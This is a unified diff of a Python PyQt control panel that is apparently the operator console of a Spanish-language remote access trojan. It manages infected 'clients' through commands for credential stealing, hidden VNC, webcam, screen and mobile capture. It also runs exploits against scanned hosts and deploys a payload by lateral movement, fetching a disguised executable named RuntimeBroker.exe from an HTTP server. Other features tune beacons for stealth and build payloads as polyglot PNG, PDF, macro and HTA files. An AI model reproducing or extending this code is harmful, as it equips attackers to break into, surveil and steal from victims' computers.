     def _stealer_traer_cid(self, cid):
         self._enviar_comando(cid, "stealer_paquete")
@@ -1654,9 +1937,7 @@ class MainWindow(QMainWindow):
         if cid not in self.clientes:
             return
         self.servidor.enviar_comando(cid, cmd, args or {})
-        if cmd not in ("raton", "teclado", "ping", "hvnc_raton", "hvnc_captura",
-                       "hvnc_teclado", "hvnc_stream", "captura_stream",
-                       "webcam_frame", "captura", "hvnc_estado", "stealer_estado"):
+        if cmd not in CMDS_SILENCIOSOS:
             self._log(f"[→] '{cmd}' a {cid[:8]}")
 
     def _pedir_y(self, cid, cmd, etiqueta, defecto):
@@ -1704,6 +1985,34 @@ class MainWindow(QMainWindow):
         dlg = ExploradorRemotoDialog(cid, self.clientes[cid]["item"].text(2), self)
         self.exploradores_por_cid.setdefault(cid, []).append(dlg)
         dlg.show()
+
+    def _abrir_movil(self, cid):
+        if cid not in self.clientes:
+            return
+        dlg = MovilDialog(cid, self.clientes[cid]["item"].text(2),
+                          info=self.clientes[cid]["info"], parent=self)
+        self.movil_por_cid.setdefault(cid, []).append(dlg)
+        dlg.show()
+
+    def _movil_msg(self, cid, cmd, datos):
+        """Reenvia una respuesta movil_* al dialogo movil de ese cliente."""
+        datos = datos or {}
+        for dlg in self.movil_por_cid.get(cid, []):
+            try:
+                if datos.get("error") and not datos.get("b64"):
+                    dlg._sig_datos.emit(cmd, datos)
+                elif cmd == "movil_pantalla":
+                    dlg._sig_pantalla.emit(datos.get("b64", ""),
+                                           int(datos.get("w") or 0),
+                                           int(datos.get("h") or 0))
+                elif cmd == "movil_camara":
+                    dlg._sig_camara.emit(datos.get("b64", ""),
+                                         int(datos.get("w") or 0),
+                                         int(datos.get("h") or 0))
+                else:
+                    dlg._sig_datos.emit(cmd, datos)
+            except Exception:
+                pass
 
     def _enrutar_frame(self, cid, datos):
         b64 = datos.get("b64", "")
@@ -1792,86 +2101,212 @@ class MainWindow(QMainWindow):
         self.btn_escanear.setEnabled(False)
 
         def worker():
-            res = escaner.escanear(objetivo, puertos,
-                                   progreso=lambda v: self._sig_escaneo_prog.emit(v),
-                                   usar_nmap=usar_nmap)
+            try:
+                res = escaner.escanear(objetivo, puertos,
+                                       progreso=lambda v: self._sig_escaneo_prog.emit(v),
+                                       usar_nmap=usar_nmap)
+            except Exception as e:
+                self._sig_nse.emit(f"[escáner] ERROR: {e}")
+                res = []
             self._sig_escaneo_fin.emit(res)
         threading.Thread(target=worker, daemon=True).start()
 
     def _escanear_wifi(self):
-        """Abre la ventana de Wi-Fi ofensivo (wifi_ofensivo)."""
+        """Va a la pestaña Wi-Fi si existe; si no, abre el diálogo clásico."""
+        if self.panel_wifi is not None:
+            self._ir_tab(self.panel_wifi)
+            return
         if not wifi_ofensivo_hay_stack():
             QMessageBox.information(
                 self, "Wi-Fi",
                 "Falta el stack 802.11 (aircrack-ng / airodump-ng / aireplay-ng / iw).\n"
                 "El escáner IP sigue funcionando sin él.")
             return
+        if WifiOfensivoDialog is None:
+            return
         self._wifi_dlg = WifiOfensivoDialog(self)
         self._wifi_dlg.show()
 
-    def _abrir_movil(self, cid):
-        if cid not in self.clientes:
+    # ------------------------------------------------------- puente Wi-Fi (RF8)
+    def _on_subred_wifi(self, subred):
+        """La pestaña Wi-Fi ha detectado la subred. Se rellena el Escáner."""
+        if not subred:
             return
-        dlg = MovilDialog(cid, self.clientes[cid]["item"].text(2),
-                          info=self.clientes[cid]["info"], parent=self)
-        self.movil_por_cid.setdefault(cid, []).append(dlg)
-        dlg.show()
+        self.in_objetivo.setText(subred)
+        self._ir_tab(self.w_escaner)
+        if self.ultimo_escaneo:
+            r = QMessageBox.question(
+                self, "Escáner",
+                f"Ya hay un escaneo previo ({len(self.ultimo_escaneo)} host(s)).\n"
+                f"¿Reemplazarlo escaneando {subred}?",
+                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
+            if r != QMessageBox.StandardButton.Yes:
+                return
+        self._log(f"[wifi] subred recibida -> {subred}")
+        if self.panel_wifi is not None and self.panel_wifi.lanzar_al_enviar:
+            self._escanear()
 
-    def _movil_msg(self, cid, cmd, datos):
-        """Reenvia una respuesta movil_* al dialogo movil de ese cliente."""
-        datos = datos or {}
-        for dlg in self.movil_por_cid.get(cid, []):
-            try:
-                if datos.get("error") and not datos.get("b64"):
-                    dlg._sig_datos.emit(cmd, datos)
-                elif cmd == "movil_pantalla":
-                    dlg._sig_pantalla.emit(datos.get("b64", ""),
-                                           int(datos.get("w", 0) or 0),
-                                           int(datos.get("h", 0) or 0))
-                elif cmd == "movil_camara":
-                    dlg._sig_camara.emit(datos.get("b64", ""),
-                                         int(datos.get("w", 0) or 0),
-                                         int(datos.get("h", 0) or 0))
-                else:
-                    dlg._sig_datos.emit(cmd, datos)
-            except Exception:
-                pass
+    def _detalle_host(self, item):
+        """Doble clic en un host: puertos, servicio y banner de ese host."""
+        ip = item.text(0)
+        self.lbl_hostdet.setText(f"Host {ip} — detalle de puertos")
+        lineas = []
+        for i in range(self.res_escaner.topLevelItemCount()):
+            it = self.res_escaner.topLevelItem(i)
+            if it.text(0) != ip:
+                continue
+            lineas.append(f"  {it.text(2):>6}/tcp  {it.text(3):<16} {it.text(4)}")
+        if not lineas:
+            self.out_hostdet.setPlainText(f"{ip}: sin puertos registrados")
+            return
+        self.out_hostdet.setPlainText(
+            f"{ip}\n" + "─" * 60 + "\n" + "\n".join(sorted(lineas)))
 
     def _on_escaneo_prog(self, v):
         self.barra.setValue(v)
 
     def _on_escaneo_fin(self, res):
         self.btn_escanear.setEnabled(True)
-        self.ultimo_escaneo = res
+        self.ultimo_escaneo = res or []
         self.barra.setValue(100)
-        for d in res:
-            for p in d["puertos"]:
+        for d in self.ultimo_escaneo:
+            for p in d.get("puertos", []):
                 QTreeWidgetItem(self.res_escaner,
                                 [d["ip"], d.get("host", ""), str(p["puerto"]),
-                                 p["servicio"], p.get("banner", "")])
-        self._log(f"[escáner] {len(res)} host(s) con puertos abiertos")
+                                 p.get("servicio", "?"), p.get("banner", "")])
+        self._log(f"[escáner] {len(self.ultimo_escaneo)} host(s) con puertos abiertos")
+        self._refrescar_botones_escaner()
 
-    def _explotar_nativo(self):
+    def _rec_de_fila_escaner(self):
+        """Construye una recomendación a partir de la fila del Escáner."""
         it = self.res_escaner.currentItem()
         if not it:
-            QMessageBox.information(self, "Nativo", "Selecciona un puerto escaneado.")
+            return None
+        try:
+            puerto = int(it.text(2))
+        except (TypeError, ValueError):
+            return None
+        for r in exploits.recomendar(self.ultimo_escaneo):
+            if r["ip"] == it.text(0) and r["puerto"] == puerto:
+                return r
+        return None
+
+    def _refrescar_botones_escaner(self):
+        r = self._rec_de_fila_escaner()
+        if hasattr(self, "btn_nativo"):
+            tiene = bool(r and exploits.tiene_nativo(r["puerto"]))
+            self.btn_nativo.setEnabled(tiene)
+            if r and not tiene:
+                self.btn_nativo.setToolTip(
+                    f"El puerto {r['puerto']} no tiene explotador nativo; "
+                    "usa 'Lanzar en cliente' o 'Copiar comando'.")
+            elif not r:
+                self.btn_nativo.setToolTip("Selecciona un puerto ya recomendado.")
+            else:
+                self.btn_nativo.setToolTip(f"Ejecuta el explotador nativo de {r['nombre']}.")
+
+    def _verificar_nse(self):
+        """Ejecuta el script NSE del exploit seleccionado (RF9)."""
+        rec = self._rec_actual() or self._rec_de_fila_escaner()
+        if not rec:
+            QMessageBox.information(
+                self, "Verificar",
+                "Selecciona un puerto (Escáner) o un exploit recomendado "
+                "(Exploits) primero.")
             return
-        ip, puerto = it.text(0), int(it.text(2))
+        cmd = exploits.comando_nmap(rec)
+        if not shutil.which("nmap"):
+            self._append_nativo("[nmap] no está instalado; comando de referencia:")
+            self._append_nativo(cmd)
+            QApplication.clipboard().setText(cmd)
+            return
+        self._append_nativo(f"[nmap] $ {cmd}")
+
+        def worker():
+            try:
+                r = subprocess.run(cmd, shell=True, capture_output=True,
+                                   text=True, timeout=300)
+                salida = ((r.stdout or "") + (r.stderr or "")).strip()
+            except Exception as e:
+                salida = f"[nmap] error: {e}"
+            self._sig_nse.emit(salida[-4000:] or "[nmap] sin salida")
+        threading.Thread(target=worker, daemon=True).start()
+
+    def _explotar_nativo(self):
+        rec = self._rec_de_fila_escaner()
+        if not rec:
+            it = self.res_escaner.currentItem()
+            if not it:
+                QMessageBox.information(self, "Nativo", "Selecciona un puerto escaneado.")
+                return
+            ip, puerto = it.text(0), int(it.text(2))
+        else:
+            ip, puerto = rec["ip"], rec["puerto"]
+        if not exploits.tiene_nativo(puerto):
+            QMessageBox.information(
+                self, "Nativo",
+                f"El puerto {puerto} no tiene explotador nativo todavía.")
+            return
         self.out_nativo.appendPlainText(f"[*] explotando {ip}:{puerto} ...")
 
         def worker():
-            r = explotadores.explotar(ip, puerto, lhost=escaner.ip_local())
-            self._sig_nativo.emit(f"[{r.metodo}] ok={r.ok}\n{r.salida or r.error}\n")
+            try:
+                r = explotadores.explotar(ip, puerto, lhost=escaner.ip_local())
+                self._sig_nativo.emit(f"[{r.metodo}] ok={r.ok}\n{r.salida or r.error}\n")
+            except Exception as e:
+                self._sig_nativo.emit(f"[nativo] error: {e}")
         threading.Thread(target=worker, daemon=True).start()
 
+    def _desplegar_agente(self):
+        """Despliega el payload en un host por movimiento lateral (RF9).
+
+        Si hay un cliente seleccionado se usa como pivote (técnica elegida en
+        la pestaña Lateral). Si no, se copia el comando al portapapeles.
+        """
+        rec = self._rec_de_fila_escaner() or self._rec_actual()
+        target = ""
+        if rec:
+            target = rec["ip"]
+        if not target:
+            target = self.in_lat_target.text().strip()
+        if not target:
+            QMessageBox.information(
+                self, "Desplegar", "Selecciona un host del Escáner o indica "
+                "un destino en la pestaña Lateral.")
+            return
+        self.in_lat_target.setText(target)
+        self._lateral_autourl()
+        url = self.in_lat_url.text().strip()
+        tecnica = self.cb_lat_tecnica.currentText()
+        try:
+            cmd = lateral.comando_completo(
+                tecnica, target, url,
+                usuario=self.in_lat_user.text().strip(),
+                password=self.in_lat_pass.text())
+        except Exception as e:
+            QMessageBox.warning(self, "Desplegar", str(e))
+            return
+        self._ir_tab(self.w_lateral)
+        self.out_lateral.appendPlainText(f"[*] {tecnica} -> {target}\n$ {cmd}\n")
+        cid = self._cid_sel()
+        if cid:
+            self._enviar_comando(cid, "shell", {"comando": cmd})
+            self._log(f"[lateral] desplegando en {target} vía {cid[:8]}")
+        else:
+            QApplication.clipboard().setText(cmd)
+            self._log(f"[lateral] sin pivote: comando de {target} copiado")
+
     def _recomendar_desde_escaneo(self):
+        if not self.ultimo_escaneo:
+            QMessageBox.information(self, "Exploits", "Escanea primero.")
+            return
         recs = exploits.recomendar(self.ultimo_escaneo)
         self.tree_exploits.clear()
         for r in recs:
             QTreeWidgetItem(self.tree_exploits,
                             [r["ip"], str(r["puerto"]), r["nombre"], r["cve"],
                              r["riesgo"], r["so"], r["cmd"]])
-        self.tabs.setCurrentIndex(1)
+        self._ir_tab(self.w_exploits)
         self._log(f"[exploits] {len(recs)} recomendación(es)")
 
     def _rec_actual(self):
@@ -1882,6 +2317,11 @@ class MainWindow(QMainWindow):
             if r["ip"] == it.text(0) and str(r["puerto"]) == it.text(1):
                 return r
         return None
+
+    def _refrescar_botones_exploits(self):
+        r = self._rec_actual()
+        if r and not exploits.tiene_nativo(r["puerto"]):
+            self._log(f"[exploits] {r['nombre']}: sin explotador nativo")
 
     def _lanzar_exploit(self):
         r = self._rec_actual()
@@ -1896,13 +2336,13 @@ class MainWindow(QMainWindow):
             QMessageBox.information(self, "Exploit", exploits.comando_para(r))
 
     def _copiar_exploit(self):
-        r = self._rec_actual()
+        r = self._rec_actual() or self._rec_de_fila_escaner()
         if r:
             QApplication.clipboard().setText(exploits.comando_para(r))
             self._log("[exploits] comando copiado")
 
     def _copiar_deteccion(self):
-        r = self._rec_actual()
+        r = self._rec_actual() or self._rec_de_fila_escaner()
         if r:
             QApplication.clipboard().setText(exploits.comando_nmap(r))
             self._log("[exploits] detección nmap copiada")
@@ -1913,14 +2353,19 @@ class MainWindow(QMainWindow):
             QMessageBox.information(self, "Exploit", "Selecciona un exploit.")
             return
         if not exploits.tiene_nativo(r["puerto"]):
-            QMessageBox.information(self, "Exploit",
-                                    "Ese puerto no tiene explotador nativo todavía.")
+            QMessageBox.information(
+                self, "Exploit",
+                f"El puerto {r['puerto']} no tiene explotador nativo. "
+                "Usa 'Lanzar en cliente' o 'Copiar comando'.")
             return
         self.out_exploits.appendPlainText(f"[*] explotando {r['ip']}:{r['puerto']} ...")
 
         def worker():
-            res = exploits.ejecutar_nativo(r, lhost=escaner.ip_local())
-            self._sig_nativo.emit(f"[{res.metodo}] ok={res.ok}\n{res.salida or res.error}\n")
+            try:
+                res = exploits.ejecutar_nativo(r, lhost=escaner.ip_local())
+                self._sig_nativo.emit(f"[{res.metodo}] ok={res.ok}\n{res.salida or res.error}\n")
+            except Exception as e:
+                self._sig_nativo.emit(f"[nativo] error: {e}")
         threading.Thread(target=worker, daemon=True).start()
 
     # ================================================================= lateral
@@ -1928,7 +2373,8 @@ class MainWindow(QMainWindow):
         host = self.in_bhost.text().strip() or escaner.ip_local()
         puerto = self.in_bhttp.text().strip() or "8080"
         nombre = self.in_bnombre.text().strip() or "RuntimeBroker"
-        self.in_lat_url.setText(f"http://{host}:{puerto}/{nombre}.exe")
+        exe = nombre + (".exe" if os.name == "nt" else "")
+        self.in_lat_url.setText(f"http://{host}:{puerto}/{exe}")
 
     def _lateral_jump(self):
         cid = self._cid_sel()
@@ -1941,10 +2387,14 @@ class MainWindow(QMainWindow):
             QMessageBox.information(self, "Lateral", "Faltan host destino o URL del payload.")
             return
         tecnica = self.cb_lat_tecnica.currentText()
-        cmd = lateral.comando_completo(
-            tecnica, target, url,
-            usuario=self.in_lat_user.text().strip(),
-            password=self.in_lat_pass.text())
+        try:
+            cmd = lateral.comando_completo(
+                tecnica, target, url,
+                usuario=self.in_lat_user.text().strip(),
+                password=self.in_lat_pass.text())
+        except Exception as e:
+            QMessageBox.warning(self, "Lateral", str(e))
+            return
         self.out_lateral.appendPlainText(f"[*] {tecnica} -> {target}\n$ {cmd}\n")
         self._enviar_comando(cid, "shell", {"comando": cmd})
 
@@ -1955,6 +2405,7 @@ class MainWindow(QMainWindow):
         cmd = lateral.limpiar(self.cb_lat_tecnica.currentText(),
                               self.in_lat_target.text().strip())
         if cmd:
+            self.out_lateral.appendPlainText(f"[*] limpieza\n$ {cmd}\n")
             self._enviar_comando(cid, "shell", {"comando": cmd})
 
     # ================================================================= beacon
@@ -1969,9 +2420,30 @@ class MainWindow(QMainWindow):
         for cid in list(self.clientes):
             self._aplicar_beacon(cid)
 
+    def _beacon_sigiloso(self):
+        """Beacon discreto a todos: sleep alto y jitter alto."""
+        self.in_sleep.setText("45")
+        self.in_jitter.setText("35")
+        self._beacon_todos()
+
+    def _beacon_quitar(self):
+        it = self.tree.currentItem()
+        cid = it.data(0, Qt.ItemDataRole.UserRole) if it else None
+        if not cid:
+            return
+        self.servidor.enviar_beacon(cid, 5.0, 20)
+        if cid in self.clientes:
+            self.clientes[cid]["beacon"] = None
+        self._log(f"[beacon] {cid[:8]} -> modo normal")
+        self._beacon_refrescar()
+
     def _aplicar_beacon(self, cid):
-        sleep = float(self.in_sleep.text() or 5)
-        jitter = int(self.in_jitter.text() or 20)
+        try:
+            sleep = float(self.in_sleep.text() or 5)
+            jitter = int(self.in_jitter.text() or 20)
+        except ValueError:
+            QMessageBox.warning(self, "Beacon", "Sleep y jitter deben ser numéricos.")
+            return
         self.servidor.enviar_beacon(cid, sleep, jitter)
         if cid in self.clientes:
             self.clientes[cid]["beacon"] = (sleep, jitter)
@@ -1979,14 +2451,32 @@ class MainWindow(QMainWindow):
         self._beacon_refrescar()
 
     def _beacon_refrescar(self):
+        """Refresca la tabla de beacons y la lista de clientes activos (RF13)."""
         self.tree_beacons.clear()
+        self.lista_clientes.clear()
         for cid, d in self.clientes.items():
             b = d.get("beacon")
             info = d["info"]
             QTreeWidgetItem(self.tree_beacons,
                             [cid[:8], info.get("host", ""), info.get("ip", ""),
+                             info.get("so", ""),
                              str(b[0]) if b else "-", str(b[1]) if b else "-",
                              "beacon activo" if b else "normal"])
+            li = QListWidgetItem(
+                f"{info.get('host', '?')}  ·  {info.get('ip', '?')}  ·  "
+                f"{info.get('so', '?')}  ·  {'BEACON' if b else 'normal'}")
+            li.setData(Qt.ItemDataRole.UserRole, cid)
+            self.lista_clientes.addItem(li)
+
+    def _seleccionar_desde_lista(self):
+        """Selecciona en el árbol el cliente elegido en la lista de Beacons."""
+        li = self.lista_clientes.currentItem()
+        if not li:
+            return
+        cid = li.data(Qt.ItemDataRole.UserRole)
+        if cid in self.clientes:
+            self.tree.setCurrentItem(self.clientes[cid]["item"])
+            self._mostrar_detalles()
 
     # ================================================================= builder
     def _buscar_icono(self):
@@ -2056,10 +2546,14 @@ class MainWindow(QMainWindow):
 
     def _build_uno(self, cual):
         c = self._hacer_constructor()
-        fn = {"exe": c.generar_exe, "py": c.generar_py, "bat": c.generar_bat,
-              "vbs": c.generar_vbs, "ps1": c.generar_ps1, "lnk": c.generar_lnk,
-              "png": c.generar_png_polyglot, "png_stego": c.generar_png_stego,
-              "pdf": c.generar_pdf, "macro": c.generar_macro, "hta": c.generar_hta}[cual]
+        mapa = {"exe": c.generar_exe, "py": c.generar_py, "bat": c.generar_bat,
+                "vbs": c.generar_vbs, "ps1": c.generar_ps1, "lnk": c.generar_lnk,
+                "png": c.generar_png_polyglot, "png_stego": c.generar_png_stego,
+                "pdf": c.generar_pdf, "macro": c.generar_macro, "hta": c.generar_hta}
+        fn = mapa.get(cual)
+        if fn is None:
+            self._sig_builder.emit(f"[builder] formato desconocido: {cual}")
+            return
 
         def worker():
             try:
@@ -2080,3 +2574,29 @@ class MainWindow(QMainWindow):
                 self._sig_builder.emit(f"[builder] ERROR http: {e}")
         threading.Thread(target=worker, daemon=True).start()
         self._sig_builder.emit(f"[builder] HTTP activo en :{c.puerto_http} (deja la ventana abierta)")
+
+    # ================================================================= cierre
+    def closeEvent(self, evento):
+        """Nada de procesos hijos ni timers vivos al salir."""
+        try:
+            self._ping_timer.stop()
+        except Exception:
+            pass
+        if self.panel_wifi is not None:
+            try:
+                self.panel_wifi.detener()
+            except Exception:
+                pass
+        for lista in (self.escritorios_por_cid, self.hvnc_por_cid,
+                      self.webcams_por_cid, self.movil_por_cid):
+            for dialogs in lista.values():
+                for d in list(dialogs):
+                    try:
+                        d.close()
+                    except Exception:
+                        pass
+        try:
+            self.servidor.detener()
+        except Exception:
+            pass
+        super().closeEvent(evento)
